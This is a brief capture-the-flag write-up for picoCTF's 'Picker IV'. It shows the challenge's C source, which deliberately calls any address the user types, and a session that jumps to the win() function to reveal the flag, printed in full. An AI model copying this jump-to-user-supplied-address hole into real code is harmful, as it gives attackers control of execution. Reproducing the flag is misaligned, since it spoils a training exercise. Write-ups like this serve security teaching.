# Picker IV




## Descripción
Can you figure out how this program works to get the flag?
Additional details will be available after launching your challenge instance.

## Solución

``` bash
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ ls    
picker-IV  picker-IV.c
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ cat picker-IV.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ gdb picker-IV               
GNU gdb (Debian 13.1-2) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from picker-IV...
(No debugging symbols found in picker-IV)
(gdb) layout asm
┌──(kali㉿kali)-[~/Descargas/3P]
└─$  nc saturn.picoctf.net 55298 
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
                                                                                                                                                           
┌──(kali㉿kali)-[~/Descargas/3P]
└─$ 


``` 

- Busacamos la drección de 'win' y esa es  la que se ingreso para encontrar la bandera:
![[Pasted image 20230520205047.png]]


## Bandera 
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}

